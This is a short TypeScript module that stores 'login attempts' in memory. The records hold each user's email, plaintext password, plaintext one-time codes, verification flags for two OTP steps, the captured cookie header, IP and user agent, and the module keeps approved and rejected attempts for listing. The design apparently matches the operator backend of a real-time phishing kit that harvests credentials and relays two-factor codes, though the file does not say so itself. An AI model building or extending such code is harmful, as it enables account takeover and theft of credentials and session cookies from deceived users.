export type LoginAttempt = {
  id: string
  email: string
  passwordPlain: string
  username: string | null
  otpPlain: string | null
  otpHash: string | null
  otpExpiresAt: number | null
  step: string
  status: string
  otp1Verified: boolean
  otp2Verified: boolean
  lastEvent: string
  ip: string | null
  userAgent: string | null
  cookieHeader: string | null
  createdAt: number
  updatedAt: number
}

type GlobalStore = {
  attempts: Map<string, LoginAttempt>
}

function getStore(): GlobalStore {
  const g = globalThis as unknown as { __loginOpsStore?: GlobalStore }
  if (!g.__loginOpsStore) {
    g.__loginOpsStore = { attempts: new Map() }
  }
  return g.__loginOpsStore
}

export function saveAttempt(a: LoginAttempt) {
  getStore().attempts.set(a.id, a)
}

export function getAttempt(id: string) {
  return getStore().attempts.get(id) ?? null
}

/** Full history on this instance (approved/rejected kept). */
export function listActiveAttempts() {
  return Array.from(getStore().attempts.values())
    .sort((a, b) => b.updatedAt - a.updatedAt)
    .slice(0, 100)
}

export const ATTEMPT_COOKIE = 'login_attempt_v1'
export const ATTEMPT_COOKIE_MAX_AGE = 60 * 60 * 2 // 2 hours
